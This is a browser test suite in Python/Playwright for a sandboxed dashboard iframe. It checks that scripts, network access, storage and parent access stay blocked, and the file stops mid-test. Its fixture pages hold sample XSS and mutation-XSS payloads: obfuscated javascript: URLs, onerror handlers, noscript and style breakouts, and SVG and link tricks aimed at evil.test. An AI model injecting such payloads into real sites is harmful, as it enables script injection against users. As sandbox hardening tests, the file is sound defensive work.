"""The remote dashboard frame in a real browser (/sandbox/dash, js/frame-shim.js, js/frame-host.js; docs/bridge-frame.md).

The parent is a small harness page served by Playwright from the live server's origin (so it behaves like a TIX
page: same origin, `import("/static/js/frame-host.js")`), the transport is the fake of js/bridge-transport.js and the
"dashboard" is a few small pages shaped like the real one: a script with ?v=, a stylesheet with a font, an image,
forms, links of every kind, an EventSource, address/cookie/storage use, a nested frame, an artifact link. Nothing here
needs the crypto or the mailbox."""
import base64
import hashlib
import json

import pytest

pytestmark = pytest.mark.browser
HARNESS = "/__dash_harness__"
PNG = base64.b64encode(base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==")).decode()


def v(text: str) -> str:
    return hashlib.sha256(text.encode()).hexdigest()[:12]


APP_JS = """(() => {
  const h = window.orchHost, out = document.getElementById("out"), r = {};
  document.documentElement.dataset.ran = "1";            // per document: the window (and its properties) outlives a page write
  window.__api = undefined;
  r.path = h.path(); r.url = h.url(); r.hash = h.hash();
  try { document.cookie = "t=1; Path=/"; r.cookie = document.cookie; } catch (e) { r.cookie = "throws"; }
  try { localStorage.setItem("a", "b"); r.ls = localStorage.getItem("a"); } catch (e) { r.ls = "throws"; }
  h.session.set("k", "v"); r.sess = h.session.get("k");
  fetch("/api/x").then((x) => x.json()).then((j) => { window.__api = j.v; });
  window.__esMsgs = [];
  window.__es = new EventSource("/events");
  window.__es.onmessage = (e) => window.__esMsgs.push(e.data);
  window.__r = r;
  window.__handled = 0;
  document.getElementById("handled").addEventListener("submit", (e) => { e.preventDefault(); window.__handled += 1; });
  document.dispatchEvent(new Event("app-ready"));
})();"""
CSS = ("body{background:rgb(1,2,3)} @font-face{font-family:F;src:url(/static/f.woff2?v=1)} "
       "#logo{width:4px;height:4px} .bg{background:url(/static/logo.png?v=1)} @import url(https://evil.test/x.css);")
EVIL_JS = "window.__evil = (window.__evil || 0) + 1;"


MXSS = """<!doctype html><html data-path="/mxss" onclick="window.__x=1"><head><title>mx</title>
<base href="https://evil.test/"><meta http-equiv="refresh" content="0;url=/healthz"><link rel="preload" href="/secret" as="script">
<link rel="prefetch" href="/secret"><link rel="modulepreload" href="/secret"></head><body onload="window.__x=1">
<h1 id="h">mx</h1>
<svg><script>window.__x = 1</script><a href="javascript:window.__x=1" id="svga"><text>x</text></a></svg>
<math><mtext><table><mglyph><style><img src=x onerror="window.__x=1"></style></mglyph></table></mtext></math>
<noscript><p title="</noscript><img src=x onerror=window.__x=1>">n</p></noscript>
<a id="ja" href="jav&#x09;ascript:window.__x=1">j1</a><a id="jb" href="  JaVaScRiPt:window.__x=1">j2</a>
<a id="jc" href="&#x6A;avascript:window.__x=1">j3</a><a id="jd" href="data:text/html,<script>window.__x=1</script>">j4</a>
<form id="jf" action="javascript:window.__x=1"><button id="jfb" formaction="javascript:window.__x=1">go</button></form>
<template id="tp"><script>window.__x = 1</script><img src=x onerror="window.__x=1"></template>
<iframe srcdoc="<script>parent.__x=1</script>"></iframe><object data="/secret"></object><embed src="/secret">
<textarea></textarea><img src=x onerror="window.__x=1"><div nonce="abc" onclick="window.__x=1" id="nn">n</div>
<style>/* </style><img src=x onerror=window.__x=1> */ p { color: red }</style>
<img id="bad" src="x" onerror="window.__x=1"></body></html>"""


def _pin(js):
    return v(js)


SCRIPTS_PAGE = ("<!doctype html><h1 id=\"h\">scripts</h1>"
                + "".join(f'<script src="{src}?v={_pin(body)}"></script>' for src, body in [
                    ("/static/a-ok.js", "window.__s_ok = 1;"), ("/static/b-plain.js", "window.__s_plain = 1;"),
                    ("/static/c-html.js", "window.__s_html = 1;"), ("/a/L-1/d-art.js", "window.__s_art = 1;"),
                    ("/api/e-api.js", "window.__s_api = 1;")]))
SVG_PAGE = """<!doctype html><h1 id="h">svg</h1>
<svg width="300" height="60"><a id="same" xlink:href="/board"><rect id="r1" width="140" height="50" fill="red"/></a>
<a id="ext" xlink:href="https://evil.test/hang"><rect id="r2" x="150" width="140" height="50" fill="blue"/></a>
<a id="anim"><animate attributeName="href" to="https://evil.test/hang" fill="freeze" dur="0.01s"/><rect id="r3" y="55" width="30" height="5"/></a>
<use id="u" href="https://evil.test/sprite.svg#x"/><set attributeName="onmouseover" to="window.__x=1"/></svg>
<link rel="dns-prefetch" href="https://evil.test/dns"><link rel="preconnect" href="https://evil.test/pc"><link rel="prerender" href="https://evil.test/pr">
<link rel="next" href="https://evil.test/next"><link rel="stylesheet" href="/static/app.css?v=1">
<a id="pinga" href="/board" ping="https://evil.test/ping">p</a>"""


def page(path, title, extra=""):
    return f"""<!doctype html><html data-path="{path}"><head><meta charset="utf-8"><title>{title}</title>
<link rel="stylesheet" href="/static/app.css?v=1"><link rel="icon" href="/static/logo.png">
<script src="/static/app.js?v={v(APP_JS)}"></script>
<script src="/static/evil.js?v=000000000000"></script><script src="/static/nov.js"></script>
<script>window.__inline = 1</script></head>
<body onload="window.__onload = 1"><h1 id="h">{title}</h1><img id="logo" src="/static/logo.png?v=1">
<a id="board" href="/board">Board</a> <a id="home" href="/">Home</a> <a id="art" href="/a/L-1/report.html">Report</a>
<a id="trick" href="/a/L-1/trick.html">Trick</a> <a id="blank" target="_blank" href="/t/L-1/x">Blank</a>
<a id="dl" download href="/a/L-1/data.csv">CSV</a> <a id="ext" target="_blank" href="https://example.com/x">Ext</a>
<a id="mail" href="mailto:a@b.c">Mail</a> <a id="frag" href="#h">frag</a> <a id="boom" href="/boom">Boom</a>
<a id="slowlink" href="/slow-page">Slow</a> <a id="mx" href="/mxss">mXSS</a> <a id="secret" href="/secret">Secret</a>
<form id="search" action="/search" method="get"><input name="q" value="x y"><button id="gs">Go</button></form>
<form id="newf" action="/new" method="post"><input name="title" value="Hello"><button id="nsub">New</button></form>
<form id="handled" action="/new" method="post"><input name="z" value="1"><button id="hb">Save</button></form>
<iframe src="/a/L-1/frame.html" title="Evil &lt;b&gt;frame&lt;/b&gt;"></iframe><div id="out"></div>{extra}</body></html>"""


def routes():
    html = {"content-type": "text/html; charset=utf-8", "content-security-policy": "default-src 'self'"}
    return {
        "/": {"body": page("/", "Home"), "headers": html, "page": True},
        "/board": {"body": page("/board", "Board"), "headers": html, "page": True},
        "/search": {"body": page("/search", "Results"), "headers": html, "page": True},
        "POST /new": {"body": page("/created", "Created"), "headers": html, "page": True, "url": "/created"},
        "/created": {"body": page("/created", "Created"), "headers": html, "page": True},
        "/slow-page": {"body": page("/slow-page", "Slow"), "headers": html, "page": True, "gate": True},
        "/mxss": {"body": MXSS, "headers": html, "page": True},
        "/boom": {"status": 500, "headers": html, "page": True,
                  "body": '<img src=x onerror="window.__pwn=1"><script>window.__pwn=1</script><b>boom</b>'},
        "/static/app.css": {"body": CSS, "headers": {"content-type": "text/css"}},
        "/static/app.js": {"body": APP_JS, "headers": {"content-type": "text/javascript"}},
        "/static/evil.js": {"body": EVIL_JS, "headers": {"content-type": "text/javascript"}},
        "/static/nov.js": {"body": EVIL_JS, "headers": {"content-type": "text/javascript"}},
        "/static/logo.png": {"b64": PNG, "headers": {"content-type": "image/png"}},
        "/static/f.woff2": {"body": "not a font", "headers": {"content-type": "font/woff2"}},
        "/api/x": {"body": '{"v": 7}', "headers": {"content-type": "application/json"}},
        "/slow": {"body": '{"v": 9}', "headers": {"content-type": "application/json"}, "gate": True},
        "/events": {"stream": True},
        "/a/L-1/report.html": {"body": "<h1>artifact</h1>", "headers": html, "page": False},
        "/a/L-1/trick.html": {"body": "<h1>tagged page</h1>", "headers": html, "page": True},
        "/a/L-1/frame.html": {"body": "<h1>nested</h1>", "headers": html},
        "/a/L-1/data.csv": {"body": "a,b\n1,2\n", "headers": {"content-type": "text/csv", "content-disposition": "attachment; filename=d.csv"}},
        "/t/L-1/x": {"body": "ticket text", "headers": {"content-type": "text/plain"}},
        "/redir": {"body": "redirected", "headers": {"content-type": "text/plain"}, "url": "/secret"},
        "/scripts": {"body": SCRIPTS_PAGE, "headers": html, "page": True},
        "/svg": {"body": SVG_PAGE, "headers": html, "page": True},
        "/static/a-ok.js": {"body": "window.__s_ok = 1;", "headers": {"content-type": "text/javascript"}},
        "/static/b-plain.js": {"body": "window.__s_plain = 1;", "headers": {"content-type": "text/plain"}},
        "/static/c-html.js": {"body": "window.__s_html = 1;", "headers": {"content-type": "text/html"}},
        "/a/L-1/d-art.js": {"body": "window.__s_art = 1;", "headers": {"content-type": "text/javascript"}},
        "/api/e-api.js": {"body": "window.__s_api = 1;", "headers": {"content-type": "text/javascript"}},
        "/secret": {"body": "SECRET", "headers": {"content-type": "text/plain"}},
    }


SCOPES = {"rules": [
    {"methods": ["GET"], "pattern": "/"}, {"methods": ["GET"], "pattern": "/board"}, {"methods": ["GET"], "pattern": "/search"},
    {"methods": ["GET"], "pattern": "/created"}, {"methods": ["GET"], "pattern": "/boom"}, {"methods": ["GET"], "pattern": "/mxss"}, {"methods": ["GET"], "pattern": "/redir"},
    {"methods": ["GET"], "pattern": "/scripts"}, {"methods": ["GET"], "pattern": "/svg"}, {"methods": ["GET"], "pattern": "/slow"},
    {"methods": ["GET"], "pattern": "/slow-page"}, {"methods": ["GET"], "pattern": "/static/*"}, {"methods": ["GET"], "pattern": "/api/*"},
    {"methods": ["GET"], "pattern": "/a/*"}, {"methods": ["GET"], "pattern": "/t/*"},
    {"methods": ["GET"], "pattern": "/events", "stream": True}, {"methods": ["POST"], "pattern": "/new"},
]}

HARNESS_HTML = """<!doctype html><html><head></head><body><div id="mount"></div><script type="module">
import { createFrameHost } from "/static/js/frame-host.js";
import { fakeTransport } from "/static/js/bridge-transport.js";
const site = window.__site;
const ev = { viewer: [], download: [], external: [], history: [], theme: [], copy: [], notice: [], log: [], origins: [], seen: [], msgs: [] };
const dec = new TextDecoder();
const gates = {};
window.__ev = ev;
window.__release = (path) => { gates[path]?.(); delete gates[path]; };
addEventListener("message", (e) => { if (e.data && e.data.k === "orch-frame-1") { ev.origins.push(e.origin); ev.seen.push(e.data.t); ev.msgs.push({ t: e.data.t, id: e.data.id, gen: e.data.gen, path: e.data.path }); } }, true);
const answer = async (req) => {
  const p = req.path.split("?")[0];
  const r = site.routes[(req.method === "POST" ? "POST " : "") + p];
  if (!r) return { status: 404, body: "not found" };
  if (r.gate) await new Promise((res) => { gates[p] = res; });
  if (r.stream) return { stream: true };
  const body = r.b64 ? Uint8Array.from(atob(r.b64), (c) => c.charCodeAt(0)) : r.body;
  return { status: r.status || 200, headers: r.headers || {}, body, page: Boolean(r.page), url: r.url };
};
window.__fake = fakeTransport(answer);
window.__mk = (limits, real) => {
  window.__host?.destroy();
  window.__host = createFrameHost({
    mount: document.getElementById("mount"), transport: window.__fake, scopes: site.scopes, start: "/", limits,
    viewer: (d) => ev.viewer.push({ path: d.path, status: d.status, type: d.headers["content-type"], body: dec.decode(d.body) }),
    download: (d) => ev.download.push({ path: d.path, body: dec.decode(d.body) }),
    external: (u) => ev.external.push(u),
    history: (h) => ev.history.push(h), theme: (t) => ev.theme.push(t),
    copy: async (t) => { ev.copy.push(t); },
    log: (m) => ev.log.push(m),
    isActive: real ? undefined : () => window.__active !== false,   // the test driver's own scripts switch real user activation on
    onPort: (p) => {      // the host's end of the channel: tests post to the frame through it, and as the frame into the host
      window.__port = p; window.__portCount = (window.__portCount || 0) + 1;
      p.addEventListener('message', (e) => { const d = e.data || {}; ev.msgs.push({ t: d.t, id: d.id, gen: d.gen, path: d.path }); });
    },
    notice: (n) => ev.notice.push(n),
  });
  return true;
};
window.__ready = true;
</script></body></html>"""


@pytest.fixture(autouse=True)
def _chromium_only(browser_name):
    if browser_name not in ("chromium", "webkit"):
        pytest.skip("Chromium and WebKit only here")


@pytest.fixture
def dash(page, live_server):
    """open(limits=None, wait=True) -> the harness page with a frame host built; frame() -> the live dashboard frame."""
    page.route(f"{live_server.url}{HARNESS}", lambda route: route.fulfill(status=200, content_type="text/html", body=HARNESS_HTML))
    page.add_init_script("window.__site = " + json.dumps({"routes": routes(), "scopes": SCOPES}))
    requests, answered, failed = [], [], []
    page.on("request", lambda r: requests.append(r.url))
    page.on("response", lambda r: answered.append(r.url))
    page.on("requestfailed", lambda r: failed.append((r.url, r.failure)))
    page.goto(live_server.url + HARNESS)
    page.wait_for_function("window.__ready === true")

    class Dash:
        base = live_server.url
        net = requests
        responses = answered
        failures = failed

        def open(self, limits=None, wait="#h", real_activation=False):
            limits = {"gestureGapMs": 0, "promptGapMs": 0, "promptDelayMs": 100, **(limits or {})}
            page.evaluate("([l, r]) => window.__mk(l, r)", [limits, real_activation])
            if wait:
                self.frame().wait_for_selector(wait, state="attached")
            return self

        def frame(self):
            page.wait_for_function("() => document.querySelector('iframe.frame-dash') !== null")
            for _ in range(100):
                fs = [f for f in page.frames if "/sandbox/dash" in f.url]
                if fs:
                    return fs[-1]
                page.wait_for_timeout(50)
            raise AssertionError("no dashboard frame")

        def ev(self, key=None):
            return page.evaluate("(k) => k ? window.__ev[k] : window.__ev", key)

        def calls(self):
            return page.evaluate("() => window.__fake.calls.map((c) => ({method: c.method, path: c.path, stream: c.stream, body: c.body ? new TextDecoder().decode(c.body) : null}))")

        def click(self, sel):
            self.frame().locator(sel).click()

        def title(self):
            return self.frame().evaluate("document.querySelector('h1') && document.querySelector('h1').textContent")

        def wait_title(self, text, seconds=30):
            """poll the current frame (it may be rebuilt meanwhile, which detaches the one being asked)"""
            for _ in range(int(seconds * 10)):
                try:
                    if self.frame().evaluate("document.querySelector('h1') && document.querySelector('h1').textContent") == text:
                        return
                except Exception:
                    pass
                page.wait_for_timeout(100)
            raise AssertionError(f"no page titled {text!r}")

        def port_event(self, **msg):
            """a message as the frame would send it on the channel (the host's port receives it)"""
            page.evaluate("(m) => window.__port.dispatchEvent(new MessageEvent('message', {data: m}))", msg)

        def to_frame(self, **msg):
            """a message to the shim on the channel, as the host would send it"""
            page.evaluate("(m) => window.__port.postMessage(m)", msg)

        def activate(self, on=True):
            """the host's user-activation test (the driver's own scripts keep real activation on, so the harness replaces it)"""
            page.evaluate("(on) => { window.__active = on; }", on)

    return Dash()


# ---- the frame itself: policy, origin, what it cannot reach -------------------------------------------------------

def test_the_dashboard_page_is_drawn_and_the_frame_is_a_null_origin_sandbox(dash, page):
    dash.open()
    f = dash.frame()
    assert f.evaluate("window.origin") == "null"
    assert page.evaluate("document.querySelector('iframe.frame-dash').getAttribute('sandbox')") == "allow-scripts"
    assert dash.title() == "Home"
    # every message the frame posted arrived with the opaque origin
    assert set(dash.ev("origins")) == {"null"}


def test_the_frame_cannot_reach_the_network(dash, browser_name):
    dash.open()
    before = len(dash.net)
    res = dash.frame().evaluate("""async () => {
      const out = {}, probe = location.origin + '/__probe__';
      const violations = [];
      document.addEventListener('securitypolicyviolation', (e) => violations.push(e.effectiveDirective));
      try { out.beacon = navigator.sendBeacon(probe, 'x'); } catch (e) { out.beacon = 'throws'; }
      try { const w = new WebSocket(probe.replace('http', 'ws')); out.ws = await new Promise((r) => { w.onerror = () => r('error'); w.onopen = () => r('open'); }); } catch (e) { out.ws = 'throws'; }
      const img = new Image(); img.src = probe + '?img'; await new Promise((r) => { img.onerror = r; img.onload = r; });
      const s = document.createElement('script'); s.src = probe + '?js'; document.body.appendChild(s);
      const x = document.createElement('iframe'); x.src = probe + '?frame'; document.body.appendChild(x);
      await new Promise((r) => setTimeout(r, 300));
      out.violations = violations;
      return out;
    }""")
    # sendBeacon may report "queued"; the policy then refuses it (a connect-src violation, no request below)
    assert res["ws"] in ("error", "throws")           # WebKit refuses the constructor itself
    # whatever the browser tried was stopped by the policy before it left: no answer, a CSP block for each
    assert not [u for u in dash.responses if "__probe__" in u], dash.responses
    probes = [(u, f) for u, f in dash.failures if "__probe__" in u]
    assert (probes or browser_name != "chromium") and all("csp" in str(f).lower() or "blocked" in str(f).lower() for _, f in probes), dash.failures
    assert {"connect-src", "img-src", "script-src-elem", "frame-src"} <= set(res["violations"]), res


def test_the_frame_cannot_read_tix_storage_cookies_or_the_parent(dash, page):
    page.goto(dash.base + "/login")           # a real TIX page: put something in the origin's storage and cookie jar
    page.evaluate("document.cookie = 'probe=tix; path=/'; localStorage.setItem('probe', 'tix')")
    page.route(f"{dash.base}{HARNESS}", lambda route: route.fulfill(status=200, content_type="text/html", body=HARNESS_HTML))
    page.goto(dash.base + HARNESS)
    page.wait_for_function("window.__ready === true")
    dash.open()
    res = dash.frame().evaluate("""() => {
      const t = (fn) => { try { return String(fn()); } catch (e) { return 'throws:' + e.name; } };
      return { cookie: document.cookie, ls: localStorage.getItem('probe'), ss: sessionStorage.getItem('probe'),
        idb: t(() => indexedDB.open('x')), parentDoc: t(() => parent.document.cookie), parentLs: t(() => parent.localStorage.length),
        top: t(() => { top.location.href = '/x'; }), caches: t(() => typeof caches), sw: t(() => navigator.serviceWorker.controller) };
    }""")
    assert "probe=tix" not in res["cookie"] and res["ls"] is None and res["ss"] is None
    assert res["idb"].startswith("throws") and res["parentDoc"].startswith("throws") and res["parentLs"].startswith("throws")
    assert res["top"].startswith("throws")


# ---- rewriting and scripts ----------------------------------------------------------------------------------------

def test_the_page_is_rewritten_scripts_styles_images_fonts(dash):
    dash.open()
    f = dash.frame()
    f.wait_for_function("() => document.documentElement.dataset.ran === '1' && window.__api === 7")
    assert f.evaluate("getComputedStyle(document.body).backgroundColor") == "rgb(1, 2, 3)"          # stylesheet applied
    css = f.evaluate("[...document.querySelectorAll('style')].map((s) => s.textContent).join('')")
    assert "blob:" in css and "evil.test" not in css and "/static/f.woff2" not in css                  # font url -> blob, @import gone
    assert f.evaluate("document.querySelector('link[rel~=stylesheet], link[rel~=icon]')") is None
    f.wait_for_function("() => document.getElementById('logo').complete && document.getElementById('logo').naturalWidth === 1")
    assert f.evaluate("document.getElementById('logo').src").startswith("blob:")
    assert f.evaluate("document.getElementById('logo').complete")


def test_scripts_need_the_nonce_and_the_version_pin(dash):
    dash.open()
    f = dash.frame()
    f.wait_for_function("() => document.documentElement.dataset.ran === '1'")
    got = f.evaluate("""async () => {
      const out = { evil: window.__evil || 0, inline: window.__inline || 0, onload: window.__onload || 0,
        leftoverScripts: document.querySelectorAll('script').length };
      const run = (make) => { window.__x = 0; const s = document.createElement('script'); make(s); document.body.appendChild(s); return window.__x; };
      out.noNonce = run((s) => { s.textContent = 'window.__x = 1'; });
      out.wrongNonce = run((s) => { s.setAttribute('nonce', 'AAAAAAAAAAAAAAAAAAAAAAAA'); s.textContent = 'window.__x = 1'; });
      const d = document.createElement('div'); d.innerHTML = '<img src=x onerror="window.__x = 1">'; document.body.appendChild(d);
      await new Promise((r) => setTimeout(r, 200));
      out.x = window.__x;
      return out;
    }""")
    assert got["evil"] == 0 and got["inline"] == 0 and got["onload"] == 0     # wrong pin, no pin, inline script, handler: none ran
    assert got["noNonce"] == 0 and got["wrongNonce"] == 0 and got["x"] == 0
    assert got["leftoverScripts"] == 0                                         # the shim removes the scripts it ran: no nonce to read


def test_assets_are_cached_across_pages(dash):
    dash.open()
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    dash.click("#board")
    dash.wait_title("Board")
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")           # the page's own script ran on the new page
    paths = [c["path"] for c in dash.calls() if c["path"].startswith("/static/")]
    assert paths.count(f"/static/app.js?v={v(APP_JS)}") == 1 and paths.count("/static/app.css?v=1") == 1, paths


# ---- the adapter: address, history, cookie, storage, clipboard, links ---------------------------------------------

def test_the_adapter_supplies_path_history_storage_cookie_copy_theme(dash, page):
    dash.open()
    f = dash.frame()
    f.wait_for_function("() => window.__r")
    r = f.evaluate("window.__r")
    assert r["path"] == "/" and r["url"] == "/" and r["hash"] == "" and r["cookie"] == "t=1" and r["ls"] == "b" and r["sess"] == "v"
    f.evaluate("() => { window.__cp = window.orchHost.copy('hello').then(() => 'copied', () => 'failed'); }")
    page.wait_for_selector(".frame-prompt")
    assert dash.ev("copy") == []                                      # asked, not written: no click in the app yet
    page.click(".frame-prompt button:text-is('Copy')")
    assert f.evaluate("window.__cp") == "copied"
    out = f.evaluate("""async () => {
      const h = window.orchHost;
      h.pageHistory.push('/board?x=1#top'); h.pageHistory.replace('/board?x=2');
      const res = h.resolve('/t/L-1?y=1#z');
      let bad; try { await h.copy('x'.repeat(3000)); bad = 'ok'; } catch (e) { bad = 'rejected'; }
      h.setTheme('dark'); h.setTheme('bogus');
      return { cur: h.pageHistory.current(), path: h.path(), search: h.search(), res, bad,
        js: [typeof h.reload, typeof h.navigate, typeof h.openLink, typeof h.download, typeof h.session.remove, typeof h.local.get],
        ext: h.resolve('https://example.com/x').internal, ctrl: h.resolve('/a\\n/b') };
    }""")
    assert out["cur"] == "/board?x=2" and out["path"] == "/board" and out["search"] == "?x=2"
    assert out["res"]["path"] == "/t/L-1" and out["res"]["hash"] == "#z" and out["res"]["internal"] is True
    assert out["ext"] is False and out["ctrl"] is None and out["bad"] == "rejected"
    # (the click on Copy just before is a gesture, so the push counts; a push with none is tested with the gestures below)
    assert dash.ev("history")[:2] == [{"op": "push", "path": "/board?x=1"}, {"op": "replace", "path": "/board?x=2"}]
    assert dash.ev("copy") == ["hello"] and dash.ev("theme") == ["dark"]      # a theme the host does not know never leaves the frame's validation


def test_links_forms_and_new_tabs_go_to_the_app(dash, page):
    dash.open()
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    dash.click("#ext")                                                     # an address outside: shown to the person first
    page.wait_for_selector(".frame-prompt")
    assert page.inner_text(".frame-prompt pre") == "https://example.com/x" and dash.ev("external") == []
    page.click(".frame-prompt button:text-is('Open')")
    page.wait_for_function("() => window.__ev.external.length === 1")
    dash.click("#mail")                                                    # mailto: nothing
    dash.click("#dl")                                                      # a download: name and size shown, the bytes on a click
    page.wait_for_selector(".frame-prompt")
    assert "d.csv" in page.inner_text(".frame-prompt pre") and dash.ev("download") == []
    page.click(".frame-prompt button:text-is('Download')")
    page.wait_for_function("() => window.__ev.download.length === 1")
    dash.click("#blank")                                                   # target=_blank inside the dashboard: the viewer, never the frame
    page.wait_for_function("() => window.__ev.viewer.length === 1")
    assert dash.ev("external") == ["https://example.com/x"]
    assert [d["path"] for d in dash.ev("download")] == ["/a/L-1/data.csv"] and dash.ev("download")[0]["body"] == "a,b\n1,2\n"
    assert [(x["path"], x["body"]) for x in dash.ev("viewer")] == [("/t/L-1/x", "ticket text")]
    assert dash.title() == "Home"
    dash.click("#frag")                                                    # an in-page fragment never leaves the page
    assert dash.title() == "Home"


def test_a_get_form_and_a_post_form_become_requests_the_page_follows(dash):
    dash.open()
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    dash.click("#gs")
    dash.wait_title("Results")
    assert {"method": "GET", "path": "/search?q=x+y"}.items() <= [c for c in dash.calls() if c["path"].startswith("/search")][0].items()
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    dash.click("#nsub")
    dash.wait_title("Created")
    post = [c for c in dash.calls() if c["method"] == "POST"]
    assert len(post) == 1 and post[0]["path"] == "/new" and post[0]["body"] == "title=Hello"
    assert dash.ev("history")[-1] == {"op": "push", "path": "/created"}


def test_enter_requestsubmit_and_a_form_the_page_handles_itself(dash, page):
    dash.open()
    f = dash.frame()
    f.wait_for_function("() => document.documentElement.dataset.ran === '1'")
    n = len(dash.calls())
    dash.click("#hb")                                      # the page's own submit handler: it prevents the default, the shim sends nothing
    f.wait_for_function("() => window.__handled === 1")
    f.locator("#handled input").press("Enter")
    f.wait_for_function("() => window.__handled === 2")
    page.wait_for_timeout(200)
    assert len(dash.calls()) == n and dash.title() == "Home"
    f.locator("#search input").press("Enter")              # implicit submission: the browser's own is refused in this sandbox
    dash.wait_title("Results")
    assert [c["path"] for c in dash.calls()[n:] if c["path"].startswith("/search")] == ["/search?q=x+y"]   # once, not twice
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    dash.frame().evaluate("document.getElementById('search').requestSubmit()")
    dash.frame().wait_for_function("() => window.__esMsgs !== undefined")
    page.wait_for_function("() => window.__fake.calls.filter((c) => c.path.startsWith('/search')).length === 2")


def test_a_nested_frame_and_an_artifact_open_in_the_viewer_not_the_frame(dash):
    dash.open()
    f = dash.frame()
    assert f.evaluate("document.querySelectorAll('iframe').length") == 0
    link = f.locator("a.orch-viewer-link")
    assert link.inner_text() == "Open Evil <b>frame</b> in the viewer"               # host-supplied text, drawn as text
    assert f.evaluate("document.querySelector('a.orch-viewer-link b')") is None
    link.click()
    f.page.wait_for_function("() => window.__ev.viewer.length === 1")
    dash.click("#art")
    dash.click("#trick")        # the host tagged this one a page; an artifact path is never one
    f.page.wait_for_function("() => window.__ev.viewer.length === 3")
    assert [x["path"] for x in dash.ev("viewer")] == ["/a/L-1/frame.html", "/a/L-1/report.html", "/a/L-1/trick.html"]
    assert dash.title() == "Home" and f.evaluate("document.body.textContent.includes('tagged page')") is False


def test_an_error_page_is_text_in_the_app_and_runs_nothing(dash, page):
    dash.open()
    dash.click("#boom")
    page.wait_for_function("() => document.querySelector('.frame-notice') && !document.querySelector('.frame-notice').hidden || window.__ev.notice.length")
    assert dash.title() == "Home"
    assert dash.ev("notice") == [{"kind": "error", "text": "The dashboard answered 500 for /boom."}]
    assert page.evaluate("window.__pwn") is None and dash.frame().evaluate("window.__pwn") is None
    # the default notice is a text line; the markup of the body never reached the app's DOM
    assert page.evaluate("document.querySelectorAll('.frame-host img, .frame-host b').length") == 0


# ---- streams, generations, history ------------------------------------------------------------------------------

def test_streams_work_and_every_navigation_closes_them_all(dash, page):
    dash.open()
    f = dash.frame()
    f.wait_for_function("() => document.documentElement.dataset.ran === '1'")
    page.wait_for_function("() => window.__fake.streams.length === 1")
    page.evaluate("window.__fake.streams[0].push('data: one\\n\\ndata: two\\n\\n')")
    f.wait_for_function("() => window.__esMsgs.length === 2")
    assert f.evaluate("window.__esMsgs") == ["one", "two"]
    f.evaluate("window.__oldEs = window.__es")
    for i in range(8):                                   # the spike leaked one stream per page and hit the six-connection limit
        dash.click("#board" if i % 2 == 0 else "#home")
        dash.wait_title("Board" if i % 2 == 0 else "Home")
        dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    page.wait_for_function("() => window.__fake.streams.length === 9")
    assert page.evaluate("window.__fake.streams.filter((s) => !s.closed).length") == 1      # only the page on screen
    assert page.evaluate("window.__fake.streams.slice(0, 8).every((s) => s.closed)")
    # (the page's own EventSource object died with its frame: see the stale-page tests below)


def test_an_answer_for_an_older_page_is_dropped(dash, page):
    dash.open()
    f = dash.frame()
    f.wait_for_function("() => document.documentElement.dataset.ran === '1'")
    f.evaluate("() => { window.__slow = 'pending'; fetch('/slow').then(() => { window.__slow = 'answered'; }, () => { window.__slow = 'dropped'; }); }")
    page.wait_for_function("() => window.__fake.calls.some((c) => c.path === '/slow')")
    dash.click("#board")
    dash.wait_title("Board")
    page.evaluate("window.__release('/slow')")
    page.wait_for_timeout(300)
    assert dash.frame().evaluate("window.__slow") in (None, "pending", "dropped")     # the new document never sees it
    assert dash.frame().evaluate("typeof window.__api") in ("undefined", "number")


def test_the_shim_drops_an_answer_that_carries_another_page_generation(dash, page):
    dash.open()
    f = dash.frame()
    f.wait_for_function("() => document.documentElement.dataset.ran === '1'")
    f.evaluate("() => { window.__g = {}; fetch('/slow').then(() => { window.__g.a = 'resolved'; }, (e) => { window.__g.a = e.message; }); }")
    page.wait_for_function("() => window.__ev.msgs.some((m) => m.path === '/slow')")
    m = page.evaluate("window.__ev.msgs.find((m) => m.path === '/slow')")
    answer = {"t": "res", "id": m["id"], "status": 200, "headers": {}, "url": "/slow"}
    page.evaluate("(a) => window.__port.postMessage({...a, body: new TextEncoder().encode('{}').buffer})", {**answer, "gen": m["gen"] + 5})   # another page
    f.wait_for_function("() => window.__g.a !== undefined")
    assert f.evaluate("window.__g.a") == "the page changed"
    # the same answer with the right generation is accepted (a fresh request)
    f.evaluate("() => { fetch('/slow').then(() => { window.__g.b = 'resolved'; }, (e) => { window.__g.b = e.message; }); }")
    page.wait_for_function("() => window.__ev.msgs.filter((m) => m.path === '/slow').length === 2")
    m2 = page.evaluate("window.__ev.msgs.filter((m) => m.path === '/slow')[1]")
    page.evaluate("(a) => window.__port.postMessage({...a, body: new TextEncoder().encode('{}').buffer})", {**answer, "id": m2["id"], "gen": m2["gen"]})
    f.wait_for_function("() => window.__g.b !== undefined")
    assert f.evaluate("window.__g.b") == "resolved"
    page.evaluate("window.__release('/slow')")


def test_the_newest_navigation_wins(dash, page):
    dash.open()
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    dash.click("#slowlink")                              # A: held at the host
    page.wait_for_function("() => window.__fake.calls.some((c) => c.path === '/slow-page')")
    dash.click("#board")                                 # B: answers at once
    dash.wait_title("Board")
    page.evaluate("window.__release('/slow-page')")
    page.wait_for_timeout(400)
    assert dash.title() == "Board"


def test_the_app_can_start_a_page_and_the_frame_follows(dash, page):
    dash.open()
    page.evaluate("window.__host.go('/board')")
    dash.wait_title("Board")
    assert dash.ev("history") == []                        # the app started it: it does not push its own history again
    assert page.evaluate("window.__host.go('/secret')") is False and page.evaluate("window.__host.go('//evil.test/x')") is False


# ---- who is talking ---------------------------------------------------------------------------------------------

def test_a_page_load_the_app_did_not_start_destroys_the_iframe(dash, page):
    dash.open()
    dash.frame().wait_for_function("() => document.documentElement.dataset.ran === '1'")
    first = page.evaluate("(window.__first = document.querySelector('iframe.frame-dash')) && 1")
    page.wait_for_timeout(1700)                            # the window a legitimate document write opens (1.5 s) is over
    dash.frame().evaluate("() => { setTimeout(() => { location.href = location.origin + '/healthz'; }, 0); }")
